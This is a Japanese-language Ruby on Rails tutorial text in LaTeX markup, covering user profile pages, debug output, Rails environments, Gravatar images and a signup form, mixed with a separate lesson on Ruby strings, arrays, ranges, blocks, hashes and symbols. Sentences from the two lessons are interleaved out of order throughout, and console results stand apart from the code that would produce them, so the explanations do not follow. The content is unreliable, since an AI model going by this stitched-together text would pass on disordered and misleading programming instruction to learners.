ユーザー登録手続きの最後には、作成されたユーザーの新しいプロファイルを表示できるようにするために、ユーザーを\emph{表示する}ためのページを作成し、ユーザー用のRESTアーキテクチャを実装する第一歩を踏み出します (\ref{sec:mvc_in_action})。
それに伴い、\ref{sec:layout_link_tests}で実装した簡明かつ表現豊かな統合テストに対して、 いくつかのテストを追加していきます。
本章では、第\ref{cha:modeling_users}章で作成したUserモデルのバリデーションを信頼し、有効なメールアドレスを持っている (可能性のある) 新規ユーザーを増やしていきます。
第\ref{cha:account_activation_and_password_reset}章では、 メールアドレスが\emph{本当に}有効であることを確かめるために、\emph{アカウントを有効化する}機能をサインアップの手順に追加します。
"One of the strings is empty"
"x is not empty"
Rubyでは、あらゆるものがオブジェクトです。従って、\kode{nil}もオブジェクトであり、これも多くのメソッドに応答できます。
ほぼあらゆるオブジェクトを文字列に変換する\kode{to\_s}メソッドを使用して、nilがメソッドに応答する例をお目にかけましょう。
この節では、まずユーザーの名前とプロファイル写真を表示するためのページを作成します。モックアップを図\ref{fig:profile_mockup_profile_name}に示しました
確かに空文字列が出力されました。今度は\emph{nil}に対してメッセージを\kode{連鎖 (chain)} して渡せることを確認します。
ユーザープロファイルページの最終的な目標は、図\ref{fig:profile_mockup}のようにユーザーのプロファイル写真と基本ユーザーデータ、そしてマイクロポストの一覧を表示することです。
NoMethodError: undefined method `empty?'
(図\ref{fig:profile_mockup}では、有名な\emph{lorem ipsum}ダミーテキストを使用しています。このテキストの成り立ちには\href{http://www.straightdope.com/columns/read/2290/what-does-the-filler-text-lorem-ipsum-mean}{面白いエピソード}があるので機会がありましたらどうぞ。)
# メッセージの連鎖
このページを作成したら、第\ref{cha:following_users}章のサンプル・アプリケーションで使用する予定です。
バージョン管理を使用している場合は、いつもと同じようにトピックブランチを作成します。
このように、\kode{nil}オブジェクト自身は\kode{empty?}メソッドには応答しないにもかかわらず、\kode{nil.to\_s}とすると応答することがわかります。
皆さんのご推察どおり、実は\kode{nil}かどうかを調べるメソッドもあります。
sign-up
この節で作成するユーザープロファイルのモックアップ
理想とする最終的なプロファイルページのモックアップ
Railsの3つの環境
この節で作成するプロファイルは、このアプリケーションにおける初めての真に動的なページになります。
\kode{if}キーワードの別の使い方を示しています。Rubyではこのように、後続する\kode{if}での条件式が真のときにだけ実行される式 (後続if) を書くことができ、コードが非常に簡潔になります。
ビューそのものは1ページのコードですが、アプリケーションのデータベースから取り出した情報を使用して各プロファイルの表示をカスタマイズします。
なお、\kode{unless}キーワードも同様に使用できます。
サンプルアプリケーションに動的なページを追加する準備として、ここでWebサイトのレイアウトにデバッグ情報を追加しましょう (リスト\ref{code:rails_debug})。
これにより、ビルトインの\kode{debug}メソッドと\kode{params}変数を使用して、各プロファイルページにデバッグ用の情報が表示されるようになります (詳細については\ref{sec:a_users_resource}で解説します)。
サイトのレイアウトにデバッグ情報を追加する
The string 'foobar' is nonempty.
Rubyにおいて\kode{nil}は特別なオブジェクトです。Rubyのオブジェクトのうち、オブジェクトそのものの論理値がfalseになるのは、\kode{false}自身とnilの2つ\emph{しかありません}。
なお、「\kode{!!}」(「バンバン (bang bang)」と読みます) という演算子を使うと、そのオブジェクトを2回否定することになるので、どんなオブジェクトも強制的に論理値に変換できます。
その他のあらゆるRubyのオブジェクトは、ゼロですら\emph{true}です。
本番環境に展開したアプリケーションではデバッグ情報を表示したくないので、リスト\ref{code:rails_debug}には以下を記述してあります。
Railsコンソールでも、リスト\ref{code:static_pages_controller}の \kode{home} アクションや、リスト\ref{code:title_helper}の\kode{full\_title}ヘルパーと同じ方法でメソッドを定義することができます
実は、この3つ以外にもカスタムの環境を作成することができます。詳細については「\href{http://railscasts.com/episodes/72-adding-an-environment}{環境を追加した場合のRailsCast} (英語)」を参照してください。
(メソッドの定義はファイルで行うのが普通なので、コンソールで行うのは少々面倒ですが、デモンストーレション目的であれば十分です)。
特に、\kode{Rails.env.development?}が\kode{true}になるのは開発環境に限られるため、以下の埋め込みRubyは
たとえば、\kode{引数}を1つ取り、引数が空かどうかに基づいたメッセージを返す\emph{string\_message}という関数を定義してみましょう。
本番アプリケーションやテストで挿入されることはありません。
It's an empty string!
(テスト環境でデバッグ情報が表示されても直接問題になることはありませんが、よいことではありません。デバッグ情報は開発環境以外では使用すべきではありません。)
  else
The string is nonempty.
Railsにはテスト環境 (\texttt{test})、開発環境 (\texttt{development})、そして本番環境 (\texttt{production}) の3つの環境がデフォルトで装備されています。
  end
Rails consoleのデフォルトの環境は\texttt{development}です。
  $ rails console
  Loading development environment
  >> Rails.env
  => "development"
  >> Rails.env.development?
最後の例を見ると分かるように、メソッドの引数を省略することも可能です (かっこですら省略可能です)。
<n>  => true
これは、以下のコードでは
  >> Rails.env.test?
  => false
引数に\emph{デフォルト}値を含めているからです (この例のデフォルト値は空の文字列です)。
このように指定すると、\kode{str}変数に引数を渡すことも渡さないこともできます。引数を渡さない場合は、指定のデフォルト値が自動的に使用されます。
上のように、Railsには\texttt{Rails}というオブジェクトがあり、それには環境の論理値 (boolean) を取る\texttt{env}という属性があります。たとえば、\texttt{Rails.env.test?}はテスト環境では\texttt{true}を返し、それ以外の環境では\texttt{false}を返します。
ここで、Rubyの関数には「\emph{暗黙の戻り値}がある」ことにご注意ください。これは、関数内で最後に評価された式の値が自動的に返されることを意味します (訳注: 関数で戻り値を明示的に指定しなかった場合の動作です)。この場合、引数の\kode{str}が空かどうかに応じて、2つのメッセージ文字列のうちのいずれかを返します。
テスト環境のデバッグなど、他の環境でconsoleを実行する必要が生じた場合は、環境をパラメータとして\texttt{console}スクリプトに渡すことができます。
もちろん、Rubyでは戻り値を明示的に指定することもできます。以下の関数は上の関数と同じ結果を返します。
  $ rails console test
  Loading test environment
  => "test"
上の説明で気付いた方もいると思いますが、2番目の\kode{return}は実はなくてもかまいません。関数中の最後に置かれた式 (この場合は \kode{"The string is nonempty."}) は、\kode{return}キーワードがなくても暗黙で値を返すためです。ここでは、両方に\kode{return}を使用する方が見た目の対称性が保たれるので好ましいと言えます。
Railsサーバーではconsoleのデフォルトの環境として\texttt{development}が使用されますが、以下のように他の環境でconsoleを実行することもできます。
メソッドで引数の変数名にどんな名前を使っても、メソッドの呼び出し側には何の影響も生じないという点にもご注目ください。
  $ rails server --environment production
つまり、最初の例の\kode{str}を別の変数名 (\kode{the\_function\_argument}など) に変更しても、メソッドの呼び出し方は全く同じです。
アプリケーションを本番環境で実行する場合、本番のデータベースが利用できないとアプリケーションを実行できません。そのため、\texttt{rake db:migrate}を本番環境で実行して本番データベースを作成します。
  $ bundle exec rake db:migrate RAILS_ENV=production
(注: console、server、migrateの3つのコマンドでは、デフォルト以外の環境を指定する方法がそれぞれ異なっており、混乱を招く可能性があります。このため、3つの場合のすべてを本コラムで説明しました。)
ところで、サンプルアプリケーションを既にHeroku上にデプロイしている場合は、\texttt{heroku run console}というコマンドを打つことで、本番環境を確認することができます。
  $ heroku run console
  => "production"
  >> Rails.env.production?
とはいうものの、まだ理解していないことが\emph{1つ}あります。\emph{Railsが\emph{どのようにして}これらを結びつけているかということです。URLをアクションにマップする方法や、\kode{full\_title}}ヘルパーをビューで利用できるようにする方法などがそうです。
当然ながら、Herokuは本番サイト用のプラットフォームなので、実行されるアプリケーションはすべて本番環境となります。
(この点を深く理解したい方には、「\emph{The Rails 4 Way}」(Obie Fernandez著) がお勧めです) 。
デバッグ出力をきれいに整形するために、第\ref{cha:filling_in_the_layout}章で作成したカスタムスタイルシートをリスト\ref{code:mixin_and_debug}のように追加します。
これはリスト\ref{code:annotated_title_helper}で使用されていました。
デバッグ表示を整形するための追加と、Sassのミックスイン.
注釈付きの\kode{title\_helper}.
ここでSassの\emph{ミックスイン}機能 (ここでは\kode{box\_sizing}) を使用しています。
# コメント行
ミックスイン機能を使用することで、CSSルールのグループをパッケージ化して複数の要素に適用することができます。たとえば以下のような変換を行います。
メソッド
ミックスインは\ref{sec:using_form_for}でも使用します。
今回の場合、デバッグ出力は図\ref{fig:home_page_with_debug}のようになります。
# 論理値テスト
サンプルアプリケーションのHomeページにデバッグ情報を表示する
図\ref{fig:home_page_with_debug}のデバッグ出力には、描画されるページの状態を把握するのに役立つ情報が含まれます。
Railsの\kode{debug}情報は \href{http://www.yaml.org/}{YAML} (一種の\href{http://catb.org/jargon/html/R/recursive-acronym.html}{再帰的略語}であり、“YAML Ain’t Markup Language” の略とされています) 形式で表示されます。YAMLは人間\emph{だけでなく}コンピュータにとっても読みやすい形式です。
\ref{sec:a_users_resource}には別の例もあります。
ユーザープロファイルページを作成するには、その前にデータベースにユーザーが登録されている必要があります。これはいわゆる「卵が先か鶏が先か」問題です。このWebサイトでは、登録ページがない状態でどうやってユーザーを登録しておけばよいでしょうか。
幸い、この問題は既に解決されています。\ref{sec:creating_and_authenticating_a_user}でRailsコンソールを使用してユーザーレコードを登録してありました。したがって、データベースの中に一人のユーザーがいるはずです。
(この問題を指摘いただいたJeremy Fleischmanに感謝します)。
(もしまだデータベース上に一人もユーザーがいない場合は、\ref{sec:creating_and_authenticating_a_user}に戻ってユーザーを追加してください。)
最後に、\kode{module ApplicationHelper}という要素について解説します。モジュールは、関連したメソッドをまとめる方法のひとつで、Rubyのクラスで\kode{include}を使用すると、このモジュールを\emph{ミックスイン (mixed in)}できます。
先ほど、コンソールの出力結果からユーザーのIDが \kode{1} であることを確認しました。次の目標は、このようなユーザー情報をWebアプリケーション上に表示することです。
単なるRubyのコードを書くのであれば、モジュールを作成するたびに明示的にインクルードして使用するのが普通ですが、Railsでは自動的にヘルパーモジュールをインクルードしてくれるので、include行をわざわざ書く必要がありません。
The result is that the \kode{full\_title} method is \href{http://catb.org/jargon/html/A/automagically.html}{automagically} available in all our views.
RESTの原則に従場合、リソースへの参照はリソース名とユニークIDを使用するのが普通です。
<n><n>    % subsection back_to_the_title_helper (end)<n><n>  \section{他のデータ構造} % (fold)<n>  \label{sec:other_data_structures}<n><n>
ユーザーを\emph{リソース}とみなす場合、id=\kode{1}のユーザーを参照するということは、/users/1というURLに対して\texttt{GET}リクエストを発行するということを意味します。
Webアプリケーションは突き詰めればただの文字列に過ぎませんが、実際にはこれらの文字列を\emph{作る}ために文字列以外のデータ構造も必要となります。
ここで\kode{show}というアクションの種類は、\emph{暗黙}のリクエストになります。RailsのREST機能が有効になっていると、\texttt{GET}リクエストは自動的に\kode{show}アクションとして扱われます。
この節では、Railsアプリケーションを書くために重要となる、いくつかのRubyのデータ構造について説明します。
\ref{sec:a_user_tour}で説明したとおり、id=\kode{1}のユーザーにアクセスするためのページのURIは/users/1となります。
<n><n>    \subsection{配列と範囲演算子} % (fold)<n>    \label{sec:arrays_and_ranges}<n><n>
配列 (array) は、特定の順序を持つ要素のリストです。
ただし、現時点でこのURLを使用してもエラーになります (図\ref{fig:profile_routing_error})。
\emph{Railsチュートリアル}ではこれまで配列について解説していませんでしたが、配列を理解することは、ハッシュ (\ref{sec:hashes_and_symbols}) やRailsのデータモデルを理解するための重要な基盤となります (データモデルとは\kode{has\_many}などの関連付けのことであり、\ref{sec:demo_user_has_many_microposts}や\ref{sec:user_micropost_associations}で詳しく説明します)。
/users/1にアクセスした時のエラーログ
Rubyの文字列の理解にだいぶ時間を使ってしまいましたので、次に進むことにします。\kode{split}メソッドを使用すると、文字列を自然に変換した配列を得ることができます。
/users/1 のURLを有効にするために、routesファイル (\kode{config/routes.rb})に以下の1行を追加します。
作成したコードをリスト\ref{code:users_resource}に示します
この操作によって、3つの文字列からなる配列が得られます。
Usersリソースをroutesファイルに追加する
\kode{split}で文字列を区切って配列にするときにはデフォルトで空白が使用されますが、以下のように他の文字を指定して区切ることもできます。
特定のユーザーを表示するページ
/users/1
多くのコンピュータ言語の慣習と同様、Rubyの配列でも\emph{ゼロオリジン}を採用しています。これは、配列の最初の要素のインデックスが0から始まり、2番目は1...と続くことを意味します。
この時点では、\emph{ルーティング}は動作していますが、対応するページが動作しているとは限りません。
=> [42, 8, 17]
たとえば、/users/1/edit がUsersコントローラの\kode{edit}アクションに正常にルーティングされているとしても、\kode{edit}アクションが存在しなければ、このURLにアクセスしたときにエラーになります。
=> 42
この行に対応するURL、アクション、名前付きルートは表\ref{table:RESTful_users}のようになります
=> 17
(表\ref{table:demo_RESTful_users}との違いを比較してみてください)。
次の3つの章に渡って、表\ref{table:RESTful_users}の他の項目も利用して、Usersリソースを完全にRESTfulなリソースにするために必要なアクションをすべて作成する予定です。
上で示したとおり、配列の要素にアクセスするには角かっこを使用します。
Rubyでは、角かっこ以外にも配列の要素にアクセスする方法が提供されています
このコードで使用している\kode{second}メソッドは、実はRuby自身の一部ではなく、Railsが追加したものです。
/users
このコードが動作するのは、RailsによるRubyの拡張がRailsコンソールによって自動的に反映されるからです。
すべてのユーザーを一覧するページ
/users/new
最後の行では、等しいことを確認する比較演算子\kode{==}を使ってみました。この演算子や \kode{!=} (“等しくない”) などの演算子は、他の多くの言語と共通です。
ユーザーを新規作成するページ (ユーザー登録)
ユーザーを作成するアクション
/users/1/edit
id=\kode{1}のユーザーを編集するページ
ユーザーを更新するアクション
配列は、上記コードの最初の行の\kode{length}メソッド以外にも、さまざまなメソッドに応答します。
ユーザーを削除するアクション
リスト\ref{code:users_resource}のUsersリソースが提供するRESTfulなルート
リスト\ref{code:users_resource}のコードを使用することで、ルーティングが有効になります。ただし、ルーティング先のページはまだありません (図\ref{fig:user_show_unknown_action})。
=> [8, 17, 42]
この問題を解決するために、\ref{sec:a_gravatar_image}で最小限のプロファイルページを作成する予定です。
=> [17, 8, 42]
URL /users/1 のルーティングは有効だがページがない状態
=> [17, 42, 8]
これはリスト\ref{code:stub_user_view}で使用されていました。
上のどのメソッドを実行した場合にも、\kode{a}自身は変更されていないという点にご注目ください。
ユーザー情報を表示するための仮のビュー
配列の内容を\emph{変更}したい場合は、そのメソッドに対応する「破壊的」メソッドを使用します。破壊的メソッドの名前には、元のメソッドの末尾に「!」を追加したものを使用するのがRubyの慣習です。
このビューでは埋め込みRubyを使用してユーザー名とメールアドレスを表示しています。インスタンス変数\kode{@user}があることを前提としています。
もちろん、ユーザー表示ページの最終的な状態はこれとは大きく異なりますし、このメールアドレスがこのまま一般に公開されるようなこともありません。
=> [42, 8, 17, 6]
=> [42, 8, 17, 6, 7]
=> [42, 8, 17, 6, 7, "foo", "bar"]
最後の例では、要素の追加を連鎖 (chain) できることを示しました。他の多くの言語の配列と異なり、Rubyでは異なる型が配列の中で共存できます (上の場合は整数と文字列)。
上では、文字列を配列に変換するのに\kode{split}を使用しました。
\kode{join}メソッドはこれと逆の動作です。
ユーザー表示ビューが正常に動作するためには、Usersコントローラ内の\kode{show}アクションに対応する\kode{@user}変数を定義する必要があります。
=> [42, 8, 17, 7, "foo", "bar"]
ご想像のとおり、ここではUserモデルの\kode{find}メソッド (\ref{sec:finding_user_objects}) を使用してデータベースからユーザーを取り出します。リスト\ref{code:user_show_action}のように書き換えてください。
=> "428177foobar"
Usersコントローラの\kode{show}アクション
=> "42, 8, 17, 7, foo, bar"
\emph{範囲 (range)} は、配列と密接に関係しています。\kode{to\_a}メソッドを使用して配列に変換すると理解しやすいと思います。
ユーザーのid読み出しには\kode{params}を使用しました。
=> 0..9
Usersコントローラにリクエストが正常に送信されると、\kode{params[:id]}の部分はユーザーidの\texttt{1}に置き換わります。つまり、この箇所は\ref{sec:finding_user_objects}で学んだ\kode{find}メソッドの \kode{User.find(1)}と同じになります。
NoMethodError: undefined method `to_a' for 9:Fixnum
(技術的な補足: \kode{params[:id]}は文字列型の \kode{"1"} ですが、\kode{find}メソッドでは自動的に整数型に変換されます)。
=> [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
ユーザーのビューとアクションが定義されたので、URL \href{http://localhost:3000/users/1}{/users/1} は完全に動作するようになりました (図\ref{fig:user_show_rails})。
\kode{0..9} は範囲として有効ですが、上の2番目の表記ではメソッドを呼ぶ際にかっこを追加する必要があることを示しています。
(もしbcrypt gemを追加してからまだ一度もRailsサーバを再起動させていない場合は、ここで再起動してください。)
範囲は、配列の要素を取り出すのに便利です。
以下のコードを使用して
id=\texttt{1}のユーザーを検索できたのは以上の仕組みによるものです (リスト\ref{code:user_show_action} )。
=> ["foo", "bar", "baz", "quux"]
Usersリソース追加後ののユーザー表示ページ
\ref{sec:a_users_resource}で、アプリケーションの振る舞いを理解するために\kode{デバッグ情報}が役に立つことを学びました。
インデックスに-1という値を指定できるのは極めて便利です。-1を使用すると、配列の長さを\emph{知らなくても}配列の最後の要素を指定することができ、これにより配列を特定の開始位置の要素から最後の要素までを一度に選択することができます。
Rails 4.2からは、\texttt{byebug} gemを使ってもっと直接的にデバッグできるようになりました (リスト\ref{code:gemfile_sample_app})。
どういう風にデバッグできるようになったのか、\kode{デバッガー}をアプリケーションに差し込んで実際に確かめてみましょう (リスト\ref{code:debugger})。
=> [2, 3, 4, 5, 6, 7, 8, 9]
デバッガーをUsersコントローラに差し込む
以下のように、文字に対しても範囲を使用できます。
上のようにdebuggerを差し込んだ後に /users/1 にアクセスしてみると、Railsサーバが\kode{byebug}のプロンプトを表示するようになります。
=> ["a", "b", "c", "d", "e"]
ここではRailsコンソールのようにコマンドを呼び出すことができて、アプリケーションの今の状態を確認することができます。
配列と範囲はいずれも、\emph{ブロック}を伴うさまざまなメソッドに対して応答することができます。ブロックは、Rubyの極めて強力な機能であり、かつわかりにくい機能でもあります。
Ctrl-Dを押すとプロンプトから抜け出すことができます。また、デバッグが終わったら\kode{show}アクション内の\kode{debugger}の行を削除してしまいましょう (リスト\ref{code:debugger_removed})。
=> 1..5
デバッガーをUsersコントローラーから取り外す
\kode{|i|}では変数名が縦棒「|」に囲まれていますが、これはブロック変数に対して使用するRubyの構文で、ブロックを操作するときに使用する変数を指定します。
この場合、範囲オブジェクトの\kode{each}メソッドは、\kode{i}という1つのローカル変数を使用してブロックを操作できます。そして、範囲に含まれるそれぞれの値をこの変数に次々に代入してブロックを実行します。
今後Railsアプリケーションの中でよく分からない挙動があったら、上のように\kode{debugger}を差し込んで調べてみましょう。トラブルが起こっていそうなコードの近くに差し込むのがコツです。
ブロックであることを示すには波かっこ { } で囲みますが、以下のようにdoとendで囲んで示すこともできます。
\texttt{byebug}を使ってシステムの状態を調査することは、アプリケーション内のエラーを追跡したりデバッグするときに非常に強力なツールになります。
前節で基本的なユーザーページの定義は終わりましたので、今度は各ユーザーのプロファイル写真のあたりをもう少し肉付けし、サイドバーも作り始めましょう。
ここでは\href{http://gravatar.com/}{Gravatar (globally recognized avatar) }をユーザープロファイルに導入してみましょう
ブロックには複数の行を記述できます (実際ほとんどのブロックは複数行です)。
ヒンズー教では、アバターは人間や動物の形をとって神が顕現したものと考えられています。
\emph{Railsチュートリアル}ではRuby共通の慣習に従って、短い1行のブロックには波かっこを使用し、長い1行や複数行のブロックには\kode{do..end}記法を使用しています。
これを拡大解釈して、\emph{アバター}という用語は、特にネット界隈で、その人物を表現するもの (かつその人そのものの一部でもある) という意味で使われます。
今度は\kode{i}の代わりに\kode{number}を使用していることにご注目ください。この変数 (ブロック変数) の名前は固定されていません。
Gravatarは無料のサービスで、プロファイル写真をアップロードして、指定したメールアドレスと関連付けることができます。
ブロックは見た目に反して奥が深く、ブロックを十分に理解するためには相当なプログラミング経験が必要です。そのためには、ブロックを含むコードをたくさん読みこなすことでブロックの本質を会得する以外に方法はありません
Gravatarは、プロファイル写真をアップロードするときの面倒な作業や、写真が欠けたりなどのトラブル、置き場所の悩みを解決します。ユーザーのメールアドレスを組み込んだGravatar専用の画像パスを構成するだけで、対応するGravatarの画像が自動的に表示されます
なおエキスパート向けには、ブロックが\emph{クロージャ}になっているということを知っていただくと理解しやすいと思います。クロージャとは、データを伴う、その場限りの無名関数です。
(カスタム画像を扱う方法については\ref{sec:micropost_images}で扱います)。
幸いなことに、人間には個別の事例を一般化する能力というものがあります。ささやかですが、\kode{map}メソッドなどを使用したブロックの使用例を参考のためにいくつか挙げてみます。
ここでは、リスト\ref{code:user_show_view_with_gravatar}のように\kode{gravatar\_for}ヘルパーメソッドを使用してGravatarの画像を利用できるようにします。
"Betelgeuse!"
ユーザー表示ビューに名前とGravatarを表示する
デフォルトでは、ヘルパーファイルで定義されているメソッドは自動的にすべてのビューで利用できます。ここでは、利便性を考えて\kode{gravatar\_for}をUsersコントローラに関連付けられているヘルパーファイルに置くことにしましょう。
=> [1, 4, 9, 16, 25]
\href{http://en.gravatar.com/site/implement/hash/}{Gravatarのホームページ}にも書かれているように、GravatarのURLは\href{http://en.wikipedia.org/wiki/MD5}{MD5ハッシュ}を用いてユーザーのメールアドレスをハッシュ化しています。
Rubyでは、\kode{Digest}ライブラリの\kode{hexdigest}メソッドを使用したMD5ハッシュアルゴリズムが実装されています。
=> ["a", "b", "c"]
=> ["A", "B", "C"]
=> "1fda4469bcbec3badf5418269ffc5968"
メールアドレスは大文字と小文字を区別しませんが (\ref{sec:format_validation})、MD5ハッシュでは大文字と小文字が区別されるので、Rubyの\kode{downcase}メソッドを使用して\kode{hexdigest}の引数を小文字に変換しています。
上に示したように、\kode{map}メソッドは、与えられたブロックを配列や範囲オブジェクトの各要素に対して適用し、その結果を返します。
(本チュートリアルでは、リスト\ref{code:email_downcase}のコールバック処理で小文字変換されたメールアドレスを利用しているため、ここで小文字変換を入れなくても結果は同じです。ただし、将来\kode{gravatar\_for}メソッドが別の場所から呼びだされる可能性を考えると、ここで小文字変換を入れることには意義があります。)
また、後半の2つの例では、\kode{map}のブロック内で宣言した引数 (char) に対してメソッドを呼び出しています。こういったケースでは省略記法が一般的で、以下のように書くこともできます。
\kode{gravatar\_for}ヘルパーを組み込んだ結果をリスト\ref{code:gravatar_for_helper}に示しました。
\kode{gravatar\_for}ヘルパーメソッドを定義する
(メソッド名に\emph{シンボル}が使われているので奇妙に見えるかもしれません。これについては\ref{sec:hashes_and_symbols}で説明します)。
リスト\ref{code:gravatar_for_helper}のコードは、Gravatarの画像タグに\kode{gravatar}クラスとユーザー名のaltテキストを追加したものを返します (altテキストを追加しておくと、視覚障害のあるユーザーがスクリーンリーダーを使用するときにも役に立ちます)。
ひとつ面白い話があります。これは実は元々Ruby on Rails独自の記法でした。しかし多くの人がこの記法を好むようになったので、今ではRubyのコア機能として導入されています。
プロフィールページは図\ref{fig:profile_with_gravatar}のようになります。ここにはデフォルトのGravatar画像が表示されていますが、これはデフォルトのメールアドレス\kode{user@example.com}が本当のメールアドレスではないためです。
最後のブロックの例として、単体テストにも目を向けてみましょう (リスト\ref{code:home_base_title_spec})。
(ちなみに\href{http://www.example.com/}{example.com}というドメイン名は、例として使用するために特別に予約されたドメインとなっています)
ユーザー表示ページにGravatarのデフォルト画像が表示されている
ここでは動作をすみずみまで理解する必要はありません (実際、\emph{筆者}もこのコードをひと目で完璧に把握できるなどとは言いません)。ここで重要なのは、テストコードに\kode{do}というキーワードがあることに気付き、そこからテストの本体が「そもそもブロックでできている」ことに気付くことです。
すなわち、この\kode{test}メソッドは文字列 (説明文) とブロックを引数にとり、テストが実行されるときにブロック内の文が実行される、ということが理解できます。
ところで、\ref{sec:heroku_commands}でランダムなサブドメインを生成するために以下のRubyコードを紹介しましたが、このコードを理解するための準備が整ったので、今こそ読み解いてみましょう。
このコードをじゅんをおっt組み立ててみると、動作がよくわかります。
=> ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o",
ユーザー表示ページにGravatarのカスタム画像が表示されている
"p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
図\ref{fig:profile_mockup_profile_name}のモックアップに近づけるために、ユーザーのサイドバーの最初のバージョンを作りましょう。
=> ["c", "g", "l", "k", "h", "z", "s", "i", "n", "d", "y", "u", "t", "j", "q",
ここでは\kode{aside}タグを使用して実装します。このタグはサイドバーなどの補完コンテンツの表示に使用されますが、単独で表示することもできます。
"b", "r", "o", "f", "e", "w", "v", "m", "a", "x", "p"]
\kode{row}クラスと\kode{col-md-4}クラスも追加しておきます。これらのクラスはBootstrapの一部です。
=> ["f", "w", "i", "a", "h", "p", "c", "x"]
ユーザー表示ページを変更した結果をリスト\ref{code:user_show_with_sidebar}に示します。
=> "mznpybuj"
ユーザーの\kode{show}ビューにサイドバーを追加する
ハッシュは、本質的には配列と同じですが、インデックスとして整数値以外のものも使用できる点が配列と異なります
(この理由から、いくつかの言語 (特にPerl) ではハッシュを\emph{連想配列}と呼ぶこともあります)。
ハッシュのインデックス (\emph{キー}と呼ぶのが普通です) は、通常何らかのオブジェクトです。
たとえば、以下のように文字列をキーとして使用できます。
HTML要素とCSSクラスを配置したことにより、プロフィールページ (とサイドバーとGravatar) にSCSSでリスト\ref{code:sidebar_css}のようにスタイルを与えることができるようになりました
リスト\ref{code:sidebar_css}では\kode{.gravatar\_edit}というCSSクラスを追加しています。これは第\ref{cha:updating_showing_and_deleting_users}章でも使われます。
(テーブルCSSのルールがネスティング (入れ子) されていますが、これが有効になるのはAsset PipelineでSassエンジンが使用されている場合に限られます) 。
ページの変更の結果を図\ref{fig:user_show_sidebar_css}に示します。
=> {"last_name"=>"Hartl", "first_name"=>"Michael"}
 SCSSを使用してサイドバーなどのユーザー表示ページにスタイルを与える
ここで重要なのは、ハッシュの波かっこは、ブロックの波かっことはまったく別物であるという点です
ここまででユーザープロファイルページがひとまず動作するようになりましたので、今度はユーザー登録フォームを作成しましょう。
(これは確かに紛らわしい点です) 。
図\ref{fig:new_signup_page} (図\ref{fig:blank_signup_page_recap}にも再録) に示したとおり、ユーザー登録ページはまだ空白のままなので、このままではユーザー登録できません。
ハッシュは配列と似ていますが、1つの重要な違いとして、ハッシュでは要素の「並び順」が保証されないという点があります
この節の目標は、このみっともないページを改造して図\ref{fig:signup_mockup}のモックアップのようなページに変えることです。
実はRuby 1.9以降では、ハッシュの要素の順序が入力順と同じであることを保証していますが、ハッシュを特定の順序に依存してカウントするのは得策ではありません。
現状のユーザー登録ページ  \href{http://localhost:3000/signup}{/signup}
もし要素の順序が重要である場合は、配列を使用する必要があります。
ハッシュの1要素を角かっこを使って定義する代わりに、以下のようにキーと値をハッシュロケットと呼ばれる\kode{=>} によってリテラル表現するほうが簡単です。
Web経由でユーザーを作成する機能をこれから追加しますので、\ref{sec:creating_and_authenticating_a_user}で作成したユーザーをここで削除しておきましょう。
最も簡単な方法は、Rakeの\kode{db:migrate:reset}タスクを実行してデータベースをリセットすることです。
ここではRubyにおける慣習として、ハッシュの最初と最後に空白を追加しています。この空白はあってもなくてもよく、コンソールでは無視されます
最後に、システムによっては変更を反映するためにターミナル上でCtrl-Cを押してWebサーバーを再起動する必要が生じることもあります。
(なぜスペースを置くようになったのかはわかりません。おそらく初期の有力な Rubyプログラマが好んだ結果、慣習となったのでしょう)。
ユーザー登録ページで重要な点は、ユーザー登録に欠かせない情報を入力するための\emph{form}です。
ここまではハッシュのキーとして文字列を使用していましたが、Railsでは文字列よりも\emph{シンボル}を使用する方が普通です。
これを行うには、Railsで\kode{form\_for}ヘルパーメソッドを使用します。このメソッドはActive Recordオブジェクトを取り込み、オブジェクトの属性を使用してフォームを構成します。
シンボルは文字列と似ていますが、クォートで囲む代わりにコロンが前に置かれている点が異なります。
ユーザー登録ページ /signup のルーティングは、Usersコントローラーの\kode{new}アクションに既に紐付けられていることを思い出してください (リスト\ref{code:signup_route})。したがって、次のステップは、 \kode{form\_for}の引数で必要となるUserオブジェクトを作成することになります
たとえば、\kode{:name}はシンボルです。
必要となる\kode{@user}変数の定義は、以下のリスト\ref{code:new_action_with_user}のようになります。
\kode{new}アクションに\kode{@user}変数を追加する
もちろん、余計なことを一切考えずに、シンボルを単なる文字列とみなしても構いません
余計なものを削ぎ落した結果、シンボル同士の比較を容易に行えます。文字列は1文字ずつ比較する必要がありますが、シンボルは一度に全体を比較できます。
フォームそのものはリスト\ref{code:signup_form}で示します。
\ref{sec:the_form_html}で詳細について触れますが、まずはリスト\ref{code:form_css}のSCSSで見栄えを整えてみましょう。
これはハッシュのキーとして理想的な性質です。
\kode{box\_sizing}ミックスインをリスト\ref{code:mixin_and_debug}から再利用していることに注目してください。
これらのCSSルールが一度適用されると、ユーザー登録ページは図\ref{fig:signup_form}のようになります.
=> ["n", "a", "m", "e"]
新規ユーザーのためのユーザー登録フォーム
NoMethodError: undefined method `split' for :name:Symbol
=> "raboof"
NoMethodError: undefined method `reverse' for :foobar:Symbol
ユーザー登録フォームのCSS
シンボルは、Ruby以外ではごく一部の言語にしか採用されていない特殊なデータ形式です。最初は奇妙に思うかもしれませんが、Railsではシンボルをふんだんに使用しているので、すぐに慣れるでしょう。
ユーザー登録フォーム
ただし文字列と違って、全ての文字が使えるわけではないことに注意してください
リスト\ref{code:signup_form}で定義したフォームを理解するために、小さなコードに分けて考えてみましょう。
とはいえ、一般的なアルファベットなどを使っている限りにおいては、シンボルで困ることはないでしょう。
まずは、埋め込みRubyが使われている\kode{form\_for}から\kode{end}までの外側の構造を読み解いていきます。
ハッシュのキーとしてシンボルを採用する場合、\kode{user} のハッシュは以下のように定義できます。
\kode{do}キーワードは、 \kode{form\_for}が1つの変数を持つブロックを取ることを表します。この変数\kode{f}は “form” のfです。
通常、Railsヘルパーを使用している場合、実装の詳細について知っておく必要はありません。ただし\emph{f}というオブジェクトが\kode{何をするのかは知っておく}必要があります。この\emph{f}オブジェクトは、\href{http://www.w3schools.com/html/html_forms.asp}{HTMLフォーム要素} (テキストフィールド、ラジオボタン、パスワードフィールドなど) に対応するメソッドが呼び出されると、\emph{@user}の属性を設定するために特別に設計されたHTMLを返します。
=> {:name=>"Michael Hartl", :email=>"michael@example.com"}
最後の例を見ると、未定義のハッシュ値は単純に\kode{nil}であることがわかります。
ハッシュではシンボルをキーとして使うことが一般的なので、Ruby 1.9ではこのような特殊な場合のための新しい記法をサポートしています。
